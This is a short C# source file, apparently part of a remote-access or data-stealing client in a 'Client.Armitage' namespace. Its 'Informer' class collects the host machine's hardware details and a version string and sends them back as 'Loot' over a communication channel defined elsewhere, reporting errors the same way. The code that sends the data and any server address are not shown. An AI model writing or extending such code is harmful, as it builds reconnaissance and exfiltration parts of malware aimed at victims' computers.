using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    public static class Informer
    {
        public static async void Start()
        {
            await Task.Run(() =>
            {
                try
                {
                    string hardwareinfo = Utilities.Hardware_Info.ToString() + Environment.NewLine + "Letter Version: " + Constants.Version.ToString();
                    Communication.String_Stacker.Send(hardwareinfo, Communication.String_Stacker.StringType.Loot);
                }
                catch (Exception ex){
                    Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                }
            });
        }
    }
}
